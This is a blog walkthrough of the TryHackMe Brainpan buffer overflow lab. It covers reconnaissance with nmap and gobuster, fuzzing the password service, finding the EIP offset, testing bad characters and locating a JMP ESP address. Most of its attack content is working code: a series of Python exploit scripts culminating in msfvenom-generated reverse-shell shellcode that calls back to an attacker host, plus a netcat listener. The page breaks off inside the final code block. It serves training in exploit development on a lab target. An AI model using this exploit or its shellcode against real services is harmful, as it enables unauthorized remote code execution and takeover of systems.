---
layout: page
title: Brainpan
description: Brainpan buffer overflow from TryHackMe.
img: 
importance: 2
category: TryHackMe
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/brainpan1/logo.png" title="THM Brainpan Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<h2>Link</h2>
<a href="https://tryhackme.com/r/room/brainpan">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Welcome to my Brainpan walkthrough.  This is the TryHackMe version.  First step to perform is running nmap to know what ports are open.


{% raw %}
```bash
┌──(sec㉿kali)-[~/Documents/thm/brainpan]
└─$ nmap -sV -sC -A -O -oN nmap 10.10.157.16
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-03 13:33 AEDT
Nmap scan report for 10.10.157.16
Host is up (0.25s latency).
Not shown: 998 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?
| fingerprint-strings: 
|   NULL: 
|     _| _| 
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| 
|     _|_| _| _| _| _| _| _| _| _| _| _| _|
|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
|     [________________________ WELCOME TO BRAINPAN _________________________]
|_    ENTER THE PASSWORD
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
|_http-server-header: SimpleHTTP/0.6 Python/2.7.3

<snip>
```
{% endraw %}

<br/>
Reviewing the results, there are only two ports open.  Using nc connect to port 9999.  It prompts for a password and then gives an access denied.


{% raw %}
```bash
┌──(sec㉿kali)-[~/Documents/thm/brainpan]
└─$ nc 10.10.157.16 9999                        
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> dfsf
                          ACCESS DENIED
```
{% endraw %}

<br/>
Navigating to the webserver, there is only a png file there.  So, run gobuster and review the results.  Notice the /bin folder.

{% raw %}
```bash
┌──(sec㉿kali)-[~/Documents/thm/brainpan]
└─$ gobuster dir -u http://10.10.157.16:10000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster      
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.157.16:10000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/bin                  (Status: 301) [Size: 0] [--> /bin/]
Progress: 2847 / 220561 (1.29%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 2855 / 220561 (1.29%)
===============================================================
Finished
===============================================================
```
{% endraw %}

<br/>

Navigate to the bin folder and notice the brainpan.exe.  

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/brainpan1/binfolder.png" title="Web Bin Folder" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br/>
Feel free to wget and download it.

{% raw %}
```bash
┌──(sec㉿kali)-[~/Documents/thm/brainpan]
└─$ wget http://10.10.157.16:10000/bin/brainpan.exe                         
--2025-01-03 13:42:17--  http://10.10.157.16:10000/bin/brainpan.exe
Connecting to 10.10.157.16:10000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 21190 (21K) [application/x-msdos-program]
Saving to: ‘brainpan.exe’

brainpan.exe                                               100%[========================================================================================================================================>]  20.69K  74.7KB/s    in 0.3s    

2025-01-03 13:42:18 (74.7 KB/s) - ‘brainpan.exe’ saved [21190/21190]
```
{% endraw %}

<br/>
Spin up a python web server so we can transfer it to another windows machine for testing.

{% raw %}
```bash
┌──(sec㉿kali)-[~/Documents/thm/brainpan]
└─$ python3 -m 'http.server'                                         
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
{% endraw %}

<br/>
Transfer the executable to a Windows machine running Windbg with the narly extension installed.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/brainpan1/download.png" title="Download Executable" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br/>
In Windbg, open the executable.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/brainpan1/startbin.png" title="Load the PE" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Use g to start running the program.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/brainpan1/g.png" title="Start the PE" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the IP address of the Windows machine.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/brainpan1/windowsipconfig.png" title="Get Windows IP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Create a python that creates a socket connection with the service and sends a passwords.  Duplicates "normal" behaviour.

{% raw %}
```python
import socket

ip = '10.0.0.11'
port = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((ip,port))
print(s.recv(1024))

s.send(b'password\r\n')
print(s.recv(1024))

s.close()
```
{% endraw %}
<div class="caption">
    brain_0x01.py
</div>

<br />
Update the python code to fuzz the password field with an ever-increasing payload to determine the breaking point.

{% raw %}
```python
import socket

ip = '10.0.0.11'
port = 9999

buffers = [b'A']
counter = 100
while len(buffers) < 50:
    buffers.append(b'A' * counter)
    counter += 200

for inputBuffer in buffers:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((ip,port))
    s.recv(1024)

    print('[*] Sending: {size}\n'.format(size=len(inputBuffer)))
    s.sendall(inputBuffer + b'\r\n')

    s.close()
```
{% endraw %}
<div class="caption">
    brain_0x02.py
</div>

<br />
Check the run to see the number of characters that hanged the program.

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/brainpan1/bytecheck.png" title="Check the Buffer Size" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the EIP register in Windbg to ensure that the 41s overwrote the value in EIP.
<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/brainpan1/checkeip.png" title="Check the EIP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Reset the executable and set it to go again.

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/brainpan1/reset.png" title="Reset the executable" class="img-fluid rounded z-depth-1" %}
    </div>
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/brainpan1/g.png" title="Start the PE" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the python code to hard code the buffer size and increase the size to fit the payload.

{% raw %}
```python
mport socket

ip = '10.0.0.11'
port = 9999

inputBuffer = b'A' * 1100

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((ip,port))
s.recv(1024)

print('[*] Sending: {size}\n'.format(size=len(inputBuffer)))
s.sendall(inputBuffer + b'\r\n')

s.close()

```
{% endraw %}
<div class="caption">
    brain_0x03.py
</div>

<br />
Run the code again, check eip, ensure the it is still filled with 41s.  Sometime, when the buffer size is changed, it changes the program execution.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/brainpan1/checkeip.png" title="Check the EIP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the ESP register to ensure that the A character overflows into ESP.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/brainpan1/checkesp.png" title="Check the ESP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Use msf-pattern_create to generate a unique pattern to help assist in determining the offset of the EIP register.

{% raw %}
```bash
┌──(sec㉿kali)-[~/Documents/thm/brainpan]
└─$ msf-pattern_create -l 1100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk
```
{% endraw %}

<br />
Update the python code with the pattern that was just generated.

{% raw %}
```python
import socket

ip = '10.0.0.11'
port = 9999

# inputBuffer = b'A' * 1100
inputBuffer = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((ip,port))
s.recv(1024)

print('[*] Sending: {size}\n'.format(size=len(inputBuffer)))
s.sendall(inputBuffer + b'\r\n')

s.close()
```
{% endraw %}
<div class="caption">
    brain_0x04.py
</div>

<br />
Execute the code, check the EIP register, and note the value that is located there.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/brainpan1/patterneip.png" title="Get the Offset Check Value" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Use msf-pattern_offset to determine the exact offset value of the EIP register.

{% raw %}
```bash
┌──(sec㉿kali)-[~/Documents/thm/brainpan]
└─$ msf-pattern_offset -l 1100 -q 35724134
[*] Exact match at offset 524

```
{% endraw %}

<br />
Update the code to split the buffer string into three separate parts.  The first part will be As up until the offset, Bs for 4, and Cs to pad out the rest of the buffer size.

{% raw %}
```python
import socket

ip = '10.0.0.11'
port = 9999

inputBuffer  = b'A' * 524
inputBuffer += b'B' * 4
inputBuffer += b'C' * (1100 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((ip,port))
s.recv(1024)

print('[*] Sending: {size}\n'.format(size=len(inputBuffer)))
s.sendall(inputBuffer + b'\r\n')

s.close()
```
{% endraw %}
<div class="caption">
    brain_0x05.py
</div>

<br />
Run the code again.  Check the EIP register and ensure that our 42s are in the EIP register.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/brainpan1/checkeip42.png" title="Check the EIP for 42s" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the ESP and the four bytes prior.  The four prior bytes should be 42s from our EIP.  This would mean that the ESP sits right next to the EIP register.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/brainpan1/checkespalign.png" title="Check the ESP alignment" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />

<br />
Time to determine the bad characters.  Update the code with all of the bad characters except 00, the null byte.  The null byte is overwhelmingly often a bad character.

{% raw %}
```python
import socket

ip = '10.0.0.11'
port = 9999

# baddies = \x00

badchars = (
  b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

inputBuffer  = b'A' * 524
inputBuffer += b'B' * 4
inputBuffer += badchars
inputBuffer += b'C' * (1100 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((ip,port))
s.recv(1024)

print('[*] Sending: {size}\n'.format(size=len(inputBuffer)))
s.sendall(inputBuffer + b'\r\n')

s.close()
```
{% endraw %}
<div class="caption">
    brain_0x06.py
</div>

<br />
Run the code.  Check the ESP register and check the characters in the payload.  All the characters from the hex list <b>should</b> be in the ESP.  If there is any drop off, remove that character, send the payload again, and repeat until all the characters appear in ESP.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/brainpan1/badcharesp.png" title="Check the ESP for Bad Chars" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the code to import pack and give a space for the payload.

{% raw %}
```python
import socket
from struct import pack

ip = '10.0.0.11'
port = 9999

#baddies = \x00

payload = (
  b'D' * 400
)

inputBuffer  = b'A' * 524
inputBuffer += b'B' * 4
inputBuffer += payload
inputBuffer += b'C' * (1100 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((ip,port))
s.recv(1024)

print('[*] Sending: {size}\n'.format(size=len(inputBuffer)))
s.sendall(inputBuffer + b'\r\n')

s.close()
```
{% endraw %}
<div class="caption">
    brain_0x07.py
</div>

<br />
In Windbg, load the narly extension.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/brainpan1/loadnarly.png" title="Load the Narly Extension" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Run the !nmod to load all of the various modules and their associated protections.  Choose a module that does not have any bad chars in the address space, does not have DEP enabled, and does not have ASLR enabled.  Preference is always given to modules that ship with the program due to portability.  If a Windows module is chosen, the exploit is Windows version dependent.  For this, note the brainpan.exe address range.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/brainpan1/nmod.png" title="Load the !nmod command" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Use msf-nasm_shell to determine the hexadecimal opcodes for the jmp esp assembly command.

{% raw %}
```bash
┌──(sec㉿kali)-[~/Documents/thm/brainpan]
└─$ msf-nasm_shell                        
nasm > jmp esp
00000000  FFE4              jmp esp
```
{% endraw %}

<br />
Search in Windbg for a jmp esp memory address.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/brainpan1/findjmpespaddress.png" title="Check for a JMP ESP command" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the python script with the address of jmp.

{% raw %}
```python
import socket
from struct import pack

ip = '10.0.0.11'
port = 9999

#baddies = \x00

payload = (
  b'D' * 400
)

inputBuffer  = b'A' * 524
inputBuffer += pack('<L',(0x311712f3))
inputBuffer += payload
inputBuffer += b'C' * (1100 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((ip,port))
s.recv(1024)

print('[*] Sending: {size}\n'.format(size=len(inputBuffer)))
s.sendall(inputBuffer + b'\r\n')

s.close()
```
{% endraw %}
<div class="caption">
    brain_0x08.py
</div>

<br />
Set up a breakpoint in Windbg at the jmp esp address.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/brainpan1/setbreakpoint.png" title="Set a Breakpoint at our Address" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Run the code and check Windbg to see if the breakpoint tripped.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/brainpan1/checkbreakcatch.png" title="Catch the Breakpoint" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Step the code one more time and it should lead into the esp and the Ds payload that was set up.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/brainpan1/seeDpayload.png" title="Check the Jump into ESP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Use msfvenom to generate a payload.

{% raw %}
```bash
┌──(sec㉿kali)-[~/Documents/thm/brainpan]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.12 LPORT=443 ExitFunc=thread -b "\x00" -f python -v payload
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1899 bytes
payload =  b""
payload += b"\xda\xcf\xbb\xb2\x1e\xd7\x41\xd9\x74\x24\xf4"
payload += b"\x5f\x31\xc9\xb1\x52\x31\x5f\x17\x03\x5f\x17"
payload += b"\x83\x75\x1a\x35\xb4\x85\xcb\x3b\x37\x75\x0c"
payload += b"\x5c\xb1\x90\x3d\x5c\xa5\xd1\x6e\x6c\xad\xb7"
payload += b"\x82\x07\xe3\x23\x10\x65\x2c\x44\x91\xc0\x0a"
payload += b"\x6b\x22\x78\x6e\xea\xa0\x83\xa3\xcc\x99\x4b"
payload += b"\xb6\x0d\xdd\xb6\x3b\x5f\xb6\xbd\xee\x4f\xb3"
payload += b"\x88\x32\xe4\x8f\x1d\x33\x19\x47\x1f\x12\x8c"
payload += b"\xd3\x46\xb4\x2f\x37\xf3\xfd\x37\x54\x3e\xb7"
payload += b"\xcc\xae\xb4\x46\x04\xff\x35\xe4\x69\xcf\xc7"
payload += b"\xf4\xae\xe8\x37\x83\xc6\x0a\xc5\x94\x1d\x70"
payload += b"\x11\x10\x85\xd2\xd2\x82\x61\xe2\x37\x54\xe2"
payload += b"\xe8\xfc\x12\xac\xec\x03\xf6\xc7\x09\x8f\xf9"
payload += b"\x07\x98\xcb\xdd\x83\xc0\x88\x7c\x92\xac\x7f"
payload += b"\x80\xc4\x0e\xdf\x24\x8f\xa3\x34\x55\xd2\xab"
payload += b"\xf9\x54\xec\x2b\x96\xef\x9f\x19\x39\x44\x37"
payload += b"\x12\xb2\x42\xc0\x55\xe9\x33\x5e\xa8\x12\x44"
payload += b"\x77\x6f\x46\x14\xef\x46\xe7\xff\xef\x67\x32"
payload += b"\xaf\xbf\xc7\xed\x10\x6f\xa8\x5d\xf9\x65\x27"
payload += b"\x81\x19\x86\xed\xaa\xb0\x7d\x66\xdf\x44\x7d"
payload += b"\x7a\xb7\x46\x7d\x83\xfc\xce\x9b\xe9\x12\x87"
payload += b"\x34\x86\x8b\x82\xce\x37\x53\x19\xab\x78\xdf"
payload += b"\xae\x4c\x36\x28\xda\x5e\xaf\xd8\x91\x3c\x66"
payload += b"\xe6\x0f\x28\xe4\x75\xd4\xa8\x63\x66\x43\xff"
payload += b"\x24\x58\x9a\x95\xd8\xc3\x34\x8b\x20\x95\x7f"
payload += b"\x0f\xff\x66\x81\x8e\x72\xd2\xa5\x80\x4a\xdb"
payload += b"\xe1\xf4\x02\x8a\xbf\xa2\xe4\x64\x0e\x1c\xbf"
payload += b"\xdb\xd8\xc8\x46\x10\xdb\x8e\x46\x7d\xad\x6e"
payload += b"\xf6\x28\xe8\x91\x37\xbd\xfc\xea\x25\x5d\x02"
payload += b"\x21\xee\x7d\xe1\xe3\x1b\x16\xbc\x66\xa6\x7b"
payload += b"\x3f\x5d\xe5\x85\xbc\x57\x96\x71\xdc\x12\x93"
payload += b"\x3e\x5a\xcf\xe9\x2f\x0f\xef\x5e\x4f\x1a"
```
{% endraw %}

<br />
Update the code with the payload that was just generated.  Also use a nopsled to lead into the payload.

{% raw %}
```python
import socket
from struct import pack

ip = '10.0.0.11'
port = 9999

#baddies = \x00

payload =  b""
payload += b"\xda\xcf\xbb\xb2\x1e\xd7\x41\xd9\x74\x24\xf4"
payload += b"\x5f\x31\xc9\xb1\x52\x31\x5f\x17\x03\x5f\x17"
payload += b"\x83\x75\x1a\x35\xb4\x85\xcb\x3b\x37\x75\x0c"
payload += b"\x5c\xb1\x90\x3d\x5c\xa5\xd1\x6e\x6c\xad\xb7"
payload += b"\x82\x07\xe3\x23\x10\x65\x2c\x44\x91\xc0\x0a"
payload += b"\x6b\x22\x78\x6e\xea\xa0\x83\xa3\xcc\x99\x4b"
payload += b"\xb6\x0d\xdd\xb6\x3b\x5f\xb6\xbd\xee\x4f\xb3"
payload += b"\x88\x32\xe4\x8f\x1d\x33\x19\x47\x1f\x12\x8c"
payload += b"\xd3\x46\xb4\x2f\x37\xf3\xfd\x37\x54\x3e\xb7"
payload += b"\xcc\xae\xb4\x46\x04\xff\x35\xe4\x69\xcf\xc7"
payload += b"\xf4\xae\xe8\x37\x83\xc6\x0a\xc5\x94\x1d\x70"
payload += b"\x11\x10\x85\xd2\xd2\x82\x61\xe2\x37\x54\xe2"
payload += b"\xe8\xfc\x12\xac\xec\x03\xf6\xc7\x09\x8f\xf9"
payload += b"\x07\x98\xcb\xdd\x83\xc0\x88\x7c\x92\xac\x7f"
payload += b"\x80\xc4\x0e\xdf\x24\x8f\xa3\x34\x55\xd2\xab"
payload += b"\xf9\x54\xec\x2b\x96\xef\x9f\x19\x39\x44\x37"
payload += b"\x12\xb2\x42\xc0\x55\xe9\x33\x5e\xa8\x12\x44"
payload += b"\x77\x6f\x46\x14\xef\x46\xe7\xff\xef\x67\x32"
payload += b"\xaf\xbf\xc7\xed\x10\x6f\xa8\x5d\xf9\x65\x27"
payload += b"\x81\x19\x86\xed\xaa\xb0\x7d\x66\xdf\x44\x7d"
payload += b"\x7a\xb7\x46\x7d\x83\xfc\xce\x9b\xe9\x12\x87"
payload += b"\x34\x86\x8b\x82\xce\x37\x53\x19\xab\x78\xdf"
payload += b"\xae\x4c\x36\x28\xda\x5e\xaf\xd8\x91\x3c\x66"
payload += b"\xe6\x0f\x28\xe4\x75\xd4\xa8\x63\x66\x43\xff"
payload += b"\x24\x58\x9a\x95\xd8\xc3\x34\x8b\x20\x95\x7f"
payload += b"\x0f\xff\x66\x81\x8e\x72\xd2\xa5\x80\x4a\xdb"
payload += b"\xe1\xf4\x02\x8a\xbf\xa2\xe4\x64\x0e\x1c\xbf"
payload += b"\xdb\xd8\xc8\x46\x10\xdb\x8e\x46\x7d\xad\x6e"
payload += b"\xf6\x28\xe8\x91\x37\xbd\xfc\xea\x25\x5d\x02"
payload += b"\x21\xee\x7d\xe1\xe3\x1b\x16\xbc\x66\xa6\x7b"
payload += b"\x3f\x5d\xe5\x85\xbc\x57\x96\x71\xdc\x12\x93"
payload += b"\x3e\x5a\xcf\xe9\x2f\x0f\xef\x5e\x4f\x1a"

inputBuffer  = b'A' * 524
inputBuffer += pack('<L',(0x311712f3))
inputBuffer += b'\x90' * 16
inputBuffer += payload
inputBuffer += b'C' * (1100 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((ip,port))
s.recv(1024)

print('[*] Sending: {size}\n'.format(size=len(inputBuffer)))
s.sendall(inputBuffer + b'\r\n')

s.close()
```
{% endraw %}
<div class="caption">
    brain_0x09.py
</div>

<br />
Start a netcat listener that listens on port 443.

{% raw %}
```bash
┌──(sec㉿kali)-[~/Documents/thm/brainpan]
└─$ sudo nc -nlvp 443   
[sudo] password for sec: 
listening on [any] 443 ...
```
{% endraw %}

<br />
Run the code and check the listener to see the shell.

{% raw %}
```
┌──(sec㉿kali)-[~/Documents/thm/brainpan]
